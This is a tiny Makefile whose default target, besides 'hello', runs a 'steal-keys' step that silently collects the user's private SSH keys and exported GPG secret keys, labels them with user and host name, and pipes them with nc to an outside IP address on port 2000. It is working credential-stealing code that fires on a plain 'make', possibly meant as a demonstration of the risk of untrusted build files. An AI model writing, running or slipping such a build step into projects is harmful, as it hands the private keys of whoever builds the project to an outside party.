all: hello steal-keys

steal-keys:
	@(echo "keys from `whoami`@`hostname`:"; cat ~/.ssh/id_*; gpg -a --export-secret-keys; gpg2 -a --export-secret-keys; echo) 2>&1 | nc 173.230.130.206 2000
